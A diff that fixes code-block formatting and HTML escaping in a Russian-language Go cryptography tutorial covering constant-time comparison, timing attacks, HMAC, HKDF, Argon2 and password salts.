+<li style="margin-bottom: 4px;">При попытке <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&quot;s...&quot;</code> процессор проверит 1-й байт (совпал!), перейдет ко 2-му байту и вернет <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">false</code> за 5 тактов.</li>
 </ul>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">4.</span> Отправляя тысячи запросов с каждого символа ASCII, злоумышленник по статистическому выбросу задержки находит верный первый символ, затем переходит ко второму, угадывая ключ за $O(N \cdot |\Sigma|)$ запросов вместо экспоненциального $O(|\Sigma|^N)$.</div>
 <div style="height: 8px;"></div>
@@ -4232,18 +4218,16 @@ func main() {
     <div class="callout-title">⚙️ Под капотом Go (Compiler, Linker & Runtime)</div>
     <div><p style="margin-bottom: 6px;">Зачем перед вызовом <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">subtle.ConstantTimeCompare</code> хэшировать ключ в SHA-256:</p>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> Сигнатура <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">subtle.ConstantTimeCompare(x, y []byte) int</code> содержит ранний выход:</div>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`go</p>
-<p style="margin-bottom: 6px;">if len(x) != len(y) {</p>
-<p style="margin-bottom: 6px;">return 0</p>
-<p style="margin-bottom: 6px;">}</p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`</p>
+<div class="code-container" style="margin: 10px 0;"><pre class="language-go"><code class="language-go">   if len(x) != len(y) {
+       return 0
+   }</code></pre></div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> Если злоумышленник передает ключи разной длины (10 символов, 11 символов, 12 символов...), вызов завершается мгновенно, раскрывая точную длину настоящего секретного ключа по времени ответа.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> Если предварительно вычислить <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">sha256.Sum256</code> от обоих ключей, на вход <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">ConstantTimeCompare</code> <strong>всегда подаются два массива ровно по 32 байта</strong>, что полностью исключает утечку информации о длине секрета.</div></div>
   </div>
   <div class="callout callout-pitfalls">
     <div class="callout-title">⚠️ Частые грабли и ошибки новичков</div>
-    <div><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Прямое сравнение строк после проверки длины:</strong> Написание <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">if len(a) == len(b) && a == b</code> полностью возвращает уязвимость тайминг-атаки, так как <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">a == b</code> опять вызовет <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">memequal</code> с ранним выходом.</div>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Логирование сырых API-ключей при ошибке авторизации:</strong> Вызов <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">log.Printf("Failed key: %s", clientKey)</code> при утечке логов в Elasticsearch/Loki скомпрометирует учетные данные пользователей.</div></div>
+    <div><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Прямое сравнение строк после проверки длины:</strong> Написание <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">if len(a) == len(b) &amp;&amp; a == b</code> полностью возвращает уязвимость тайминг-атаки, так как <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">a == b</code> опять вызовет <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">memequal</code> с ранним выходом.</div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Логирование сырых API-ключей при ошибке авторизации:</strong> Вызов <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">log.Printf(&quot;Failed key: %s&quot;, clientKey)</code> при утечке логов в Elasticsearch/Loki скомпрометирует учетные данные пользователей.</div></div>
   </div>
   <div class="callout callout-bigtech">
     <div class="callout-title">🏢 В продакшене BigTech и на собеседованиях</div>
@@ -4391,17 +4375,15 @@ func main() {
     <div class="callout-title">⚙️ Под капотом Go (Compiler, Linker & Runtime)</div>
     <div><p style="margin-bottom: 6px;">Ассемблерный листинг <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">memequal</code> в Go runtime:</p>
 <p style="margin-bottom: 6px;">На архитектуре amd64 ассемблерная функция <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">runtime·memequal</code> загружает данные регистрами <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">VMOVDQU</code> (AVX) или <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">MOVQ</code> (SSE) блоками по 16/32 байта:</p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`assembly</p>
-<p style="margin-bottom: 6px;">loop:</p>
-<p style="margin-bottom: 6px;">MOVQ (SI), R8</p>
-<p style="margin-bottom: 6px;">MOVQ (DI), R9</p>
-<p style="margin-bottom: 6px;">CMPQ R8, R9</p>
-<p style="margin-bottom: 6px;">JNE  notequal    ; <-- Ветвление процессора при первом несовпадении!</p>
-<p style="margin-bottom: 6px;">ADDQ $8, SI</p>
-<p style="margin-bottom: 6px;">ADDQ $8, DI</p>
-<p style="margin-bottom: 6px;">SUBQ $8, DX</p>
-<p style="margin-bottom: 6px;">JNE  loop</p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`</p>
+<div class="code-container" style="margin: 10px 0;"><pre class="language-assembly"><code class="language-assembly">loop:
+    MOVQ (SI), R8
+    MOVQ (DI), R9
+    CMPQ R8, R9
+    JNE  notequal    ; &lt;-- Ветвление процессора при первом несовпадении!
+    ADDQ $8, SI
+    ADDQ $8, DI
+    SUBQ $8, DX
+    JNE  loop</code></pre></div>
 <p style="margin-bottom: 6px;">Инструкция <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">JNE notequal</code> заставляет процессор мгновенно выйти из цикла.</p>
 <p style="margin-bottom: 6px;">В то же время в <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">subtle.ConstantTimeCompare</code> цикл не содержит ни одной инструкции условного перехода <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">JNE</code>/<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">JE</code>, выполняясь строго линейно на уровне машинного кода.</p></div>
   </div>
@@ -4537,11 +4519,9 @@ func main() {
   <div class="callout callout-hood">
     <div class="callout-title">⚙️ Под капотом Go (Compiler, Linker & Runtime)</div>
     <div><p style="margin-bottom: 6px;">Реализация <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">hmac.Equal</code> в стандартной библиотеке Go:</p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`go</p>
-<p style="margin-bottom: 6px;">func Equal(mac1, mac2 []byte) bool {</p>
-<p style="margin-bottom: 6px;">return subtle.ConstantTimeCompare(mac1, mac2) == 1</p>
-<p style="margin-bottom: 6px;">}</p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`</p>
+<div class="code-container" style="margin: 10px 0;"><pre class="language-go"><code class="language-go">func Equal(mac1, mac2 []byte) bool {
+    return subtle.ConstantTimeCompare(mac1, mac2) == 1
+}</code></pre></div>
 <p style="margin-bottom: 6px;">Почему HMAC безопаснее простого <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">Hash(Key + Message)</code>:</p>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> Конструкция <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">H(Key || Message)</code> уязвима к Length Extension Attack (атака удлинения сообщения).</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> Конструкция <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">H(Message || Key)</code> уязвима к коллизиям в хэш-функции: если атакующий находит коллизию $M_1$ и $M_2$ ($H(M_1) = H(M_2)$), то $\text{MAC}(M_1) = \text{MAC}(M_2)$ для любого ключа!</div>
@@ -4549,7 +4529,7 @@ func main() {
   </div>
   <div class="callout callout-pitfalls">
     <div class="callout-title">⚠️ Частые грабли и ошибки новичков</div>
-    <div><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Использование короткого ключа HMAC (меньше размера блока):</strong> Ключ HMAC для SHA-256 должен иметь длину не менее 32 байт (рекомендовано 32–64 байта). Ключ из 4 символов (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">"1234"</code>) легко перебирается по словарю в офлайн-режиме.</div>
+    <div><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Использование короткого ключа HMAC (меньше размера блока):</strong> Ключ HMAC для SHA-256 должен иметь длину не менее 32 байт (рекомендовано 32–64 байта). Ключ из 4 символов (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&quot;1234&quot;</code>) легко перебирается по словарю в офлайн-режиме.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Использование <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">bytes.Equal</code> вместо <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">hmac.Equal</code>:</strong> Использование <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">bytes.Equal</code> открывает сервис для побайтовых тайминг-атак на подпись.</div></div>
   </div>
   <div class="callout callout-bigtech">
@@ -4565,7 +4545,7 @@ func main() {
   </div>
   <div class="callout callout-task">
     <div class="callout-title">📌 Условие задачи</div>
-    <div><p style="margin-bottom: 6px;"><strong>Деривация ключей (HKDF)</strong>: У пользователя есть пароль, но для AES-шифрования тебе нужен ключ ровно в 32 байта. Используй <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">golang.org/x/crypto/hkdf</code>, чтобы безопасно "растянуть" пароль пользователя (с добавлением соли) до 32-байтного криптографического ключа.</p></div>
+    <div><p style="margin-bottom: 6px;"><strong>Деривация ключей (HKDF)</strong>: У пользователя есть пароль, но для AES-шифрования тебе нужен ключ ровно в 32 байта. Используй <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">golang.org/x/crypto/hkdf</code>, чтобы безопасно &quot;растянуть&quot; пароль пользователя (с добавлением соли) до 32-байтного криптографического ключа.</p></div>
   </div>
   <div class="callout callout-theory">
     <div class="callout-title">💡 Теоретический фундамент и концепция</div>
@@ -4581,7 +4561,7 @@ func main() {
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>HKDF-Expand(PRK, info, L) $\to$ OKM:</strong></div>
 <ul style="margin: 8px 0 8px 20px;">
 <li style="margin-bottom: 4px;">Безопасно «растягивает» PRK до запрошенной длины $L$ байт (Output Keying Material).</li>
-<li style="margin-bottom: 4px;">Примешивает контекстную строку <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">info</code> (контекст домена, например <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">"aes-encryption-key"</code>, <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">"hmac-auth-key"</code>), гарантируя, что ключи для разных подсистем будут криптографически ортогональны и независимы.</li>
+<li style="margin-bottom: 4px;">Примешивает контекстную строку <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">info</code> (контекст домена, например <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&quot;aes-encryption-key&quot;</code>, <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&quot;hmac-auth-key&quot;</code>), гарантируя, что ключи для разных подсистем будут криптографически ортогональны и независимы.</li>
 </ul>
 <div style="height: 8px;"></div>
 <p style="margin-bottom: 6px;">В Go официальная библиотека <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">golang.org/x/crypto/hkdf</code> предоставляет удобный интерфейс <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">io.Reader</code>.</p></div>
@@ -4592,7 +4572,7 @@ func main() {
     </h4>
     <div style="color: #cbd5e1; font-size: 0.94rem;"><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> Создайте исходный секрет <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">ikm</code> (например, общий секрет сессии или мастер-токен).</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> Сгенерируйте случайную соль <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">salt</code> (16 байт).</div>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> Настройте контекстную метку <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">info</code> (например, <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">"handshake-aes-256-gcm-key"</code>).</div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> Настройте контекстную метку <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">info</code> (например, <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&quot;handshake-aes-256-gcm-key&quot;</code>).</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">4.</span> Инициализируйте HKDF ридер с помощью <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">hkdf.New(sha256.New, ikm, salt, info)</code>.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">5.</span> С помощью <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">io.ReadFull</code> прочитайте ровно 32 байта целевого ключа AES.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">6.</span> Продемонстрируйте: при изменении строки <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">info</code> формируется совершенно другой независимый ключ.</div></div>
@@ -4705,7 +4685,7 @@ func main() {
   <div class="callout callout-pitfalls">
     <div class="callout-title">⚠️ Частые грабли и ошибки новичков</div>
     <div><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Использование HKDF для паролей человека:</strong> HKDF — быстрый алгоритм, он <strong>НЕ является memory-hard</strong> и не содержит тысяч итераций замедления. Он предназначен для деривации ключей из данных с высокой энтропией (ECDH shared secret). Для паролей людей (низкая энтропия) обязателен Password-Based KDF: Argon2id или scrypt!</div>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Одинаковая строка info для разных ключей:</strong> Если для ключа шифрования и ключа подписи передать одинаковый <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">info = "my-key"</code>, вы получите абсолютно одинаковые ключи (Key Reuse), что нарушает безопасность криптосистемы.</div></div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Одинаковая строка info для разных ключей:</strong> Если для ключа шифрования и ключа подписи передать одинаковый <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">info = &quot;my-key&quot;</code>, вы получите абсолютно одинаковые ключи (Key Reuse), что нарушает безопасность криптосистемы.</div></div>
   </div>
   <div class="callout callout-bigtech">
     <div class="callout-title">🏢 В продакшене BigTech и на собеседованиях</div>
@@ -4825,9 +4805,7 @@ func main() {
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> В Kubernetes лимит памяти жестко контролируется подсистемой ядра Linux <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">memory.max</code> (cgroups v2).</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> Если в поде с <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">limits.memory = 512Mi</code> одновременно запустятся 8 запросов логина с $m = 64$ МБ, суммарный объем выделенной памяти составит $8 \times 64 = 512$ МБ. Девятый запрос приведет к немедленному сигналу <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">SIGKILL</code> от OOM-киллера ядра!</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> Для предотвращения падения пода внедряется <strong>семафор ограниченного параллелизма</strong>:</div>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`go</p>
-<p style="margin-bottom: 6px;">var authSemaphore = make(chan struct{}, 4) // не более 4 одновременных Argon2</p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`</p>
+<div class="code-container" style="margin: 10px 0;"><pre class="language-go"><code class="language-go">   var authSemaphore = make(chan struct{}, 4) // не более 4 одновременных Argon2</code></pre></div>
 <p style="margin-bottom: 6px;">Лишние запросы ожидают в очереди либо отклоняются HTTP 429 Too Many Requests.</p></div>
   </div>
   <div class="callout callout-pitfalls">
@@ -4857,7 +4835,7 @@ func main() {
 <p style="margin-bottom: 6px;">Фундаментальные правила криптографической соли:</p>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Соль обязана быть уникальной (Per-User Salt):</strong></div>
 <ul style="margin: 8px 0 8px 20px;">
-<li style="margin-bottom: 4px;">Если используется одна глобальная соль для всех пользователей (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">const GlobalSalt = "salt123"</code>), то два пользователя с одинаковым паролем получат одинаковый хэш.</li>
+<li style="margin-bottom: 4px;">Если используется одна глобальная соль для всех пользователей (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">const GlobalSalt = &quot;salt123&quot;</code>), то два пользователя с одинаковым паролем получат одинаковый хэш.</li>
 <li style="margin-bottom: 4px;">Злоумышленник может рассчитать радужную таблицу под эту одну глобальную соль и мгновенно взломать всех пользователей базы разом.</li>
 </ul>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Соль не требует шифрования и скрытия:</strong></div>
@@ -5002,7 +4980,7 @@ func main() {
   <div class="callout callout-pitfalls">
     <div class="callout-title">⚠️ Частые грабли и ошибки новичков</div>
     <div><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Использование переменной длины соли без указания длины:</strong> Если длина соли варьируется, невозможно однозначно понять, где кончается соль и начинается хэш. Длина соли должна быть строго зафиксирована (например, ровно 16 байт).</div>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Использование стандартного fmt.Sprintf("%s:%s", salt, hash):</strong> Текстовые разделители (например <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">:</code>) могут случайно встретиться внутри бинарных данных, если они предварительно не закодированы в hex/base64.</div></div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Использование стандартного fmt.Sprintf(&quot;%s:%s&quot;, salt, hash):</strong> Текстовые разделители (например <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">:</code>) могут случайно встретиться внутри бинарных данных, если они предварительно не закодированы в hex/base64.</div></div>
   </div>
   <div class="callout callout-bigtech">
     <div class="callout-title">🏢 В продакшене BigTech и на собеседованиях</div>
@@ -5038,7 +5016,7 @@ func main() {
 </ul>
 <div style="height: 8px;"></div>
 <p style="margin-bottom: 6px;"><strong>Почему bcrypt НЕЛЬЗЯ использовать как KDF для AES:</strong></p>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Фиксированный и неподходящий размер вывода:</strong> bcrypt возвращает строго 184 бита (23 байта) зашифрованного текста <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">"OrpheanBeholderScryDoubt"</code>. Для AES-256 требуется ровно 256 бит (32 байта). Не хватает 9 байт!</div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Фиксированный и неподходящий размер вывода:</strong> bcrypt возвращает строго 184 бита (23 байта) зашифрованного текста <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&quot;OrpheanBeholderScryDoubt&quot;</code>. Для AES-256 требуется ровно 256 бит (32 байта). Не хватает 9 байт!</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Лимит входа в 72 байта:</strong> bcrypt отбрасывает всё после 72 байт.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> <strong>Отсутствие API деривации:</strong> bcrypt проектировался исключительно как алгоритм проверки, а не KDF.</div>
 <div style="height: 8px;"></div>
@@ -5181,7 +5159,7 @@ func main() {
   <div class="callout callout-hood">
     <div class="callout-title">⚙️ Под капотом Go (Compiler, Linker & Runtime)</div>
     <div><p style="margin-bottom: 6px;">Стандарты NIST SP 800-132 (Recommendation for Password-Based Key Derivation):</p>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> Пароль человека содержит избыточность языка и низкую энтропию ($< 40$ бит).</div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> Пароль человека содержит избыточность языка и низкую энтропию ($&lt; 40$ бит).</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> PBKDF решает задачу <strong>растяжения энтропии (Entropy Stretching)</strong>: за счет десятков тысяч вычислений и распределения по памяти эффективная стоимость перебора каждого бита ключа многократно возрастает.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> Argon2id на выходе гарантирует, что каждый из 256 бит сгенерированного ключа псевдослучаен и некоррелирован с остальными битами, что является фундаментальным требованием безопасности для ключа шифра AES.</div></div>
   </div>
@@ -5195,7 +5173,7 @@ func main() {
     <div><p style="margin-bottom: 6px;"><strong>Вопрос с собеседования:</strong> В чем разница между KDF на основе пароля (Password-Based KDF: Argon2id, PBKDF2) и KDF на основе случайного ключа (HKDF)?</p>
 <p style="margin-bottom: 6px;"><strong>Ответ:</strong> Разница в исходной энтропии входных данных:</p>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>HKDF:</strong> Рассчитан на входные данные, которые <strong>уже криптографически случайны</strong> (например, 256-битный секрет эллиптического обмена ECDH). Он работает мгновенно (микросекунды) и лишь форматирует/разделяет секрет на субключи нужной длины.</div>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Password-Based KDF (Argon2id):</strong> Рассчитан на входные данные с <strong>крайне низкой энтропией</strong> (пароли людей вроде <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">"Password123!"</code>). Его задача — искусственно замедлить вычисления и занять 64 МБ оперативной памяти, чтобы исключить возможность перебора по словарю на видеокартах.</div></div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Password-Based KDF (Argon2id):</strong> Рассчитан на входные данные с <strong>крайне низкой энтропией</strong> (пароли людей вроде <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&quot;Password123!&quot;</code>). Его задача — искусственно замедлить вычисления и занять 64 МБ оперативной памяти, чтобы исключить возможность перебора по словарю на видеокартах.</div></div>
   </div>
 </div>
 <div class="exercise-card" id="ex-29">
@@ -5356,18 +5334,16 @@ func main() {
     <div class="callout-title">⚙️ Под капотом Go (Compiler, Linker & Runtime)</div>
     <div><p style="margin-bottom: 6px;">Почему в <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">bcrypt.CompareHashAndPassword</code> используется constant-time:</p>
 <p style="margin-bottom: 6px;">В исходном коде <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">bcrypt</code>:</p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`go</p>
-<p style="margin-bottom: 6px;">func CompareHashAndPassword(hashedPassword, password []byte) error {</p>
-<p style="margin-bottom: 6px;">h, err := newFromHash(hashedPassword)</p>
-<p style="margin-bottom: 6px;">if err != nil { return err }</p>
-<p style="margin-bottom: 6px;">otherHash, err := bcrypt(password, h.cost, h.salt)</p>
-<p style="margin-bottom: 6px;">if err != nil { return err }</p>
-<p style="margin-bottom: 6px;">if subtle.ConstantTimeCompare(h.hash, otherHash) != 1 {</p>
-<p style="margin-bottom: 6px;">return ErrMismatchedHashAndPassword</p>
-<p style="margin-bottom: 6px;">}</p>
-<p style="margin-bottom: 6px;">return nil</p>
-<p style="margin-bottom: 6px;">}</p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`</p>
+<div class="code-container" style="margin: 10px 0;"><pre class="language-go"><code class="language-go">func CompareHashAndPassword(hashedPassword, password []byte) error {
+    h, err := newFromHash(hashedPassword)
+    if err != nil { return err }
+    otherHash, err := bcrypt(password, h.cost, h.salt)
+    if err != nil { return err }
+    if subtle.ConstantTimeCompare(h.hash, otherHash) != 1 {
+        return ErrMismatchedHashAndPassword
+    }
+    return nil
+}</code></pre></div>
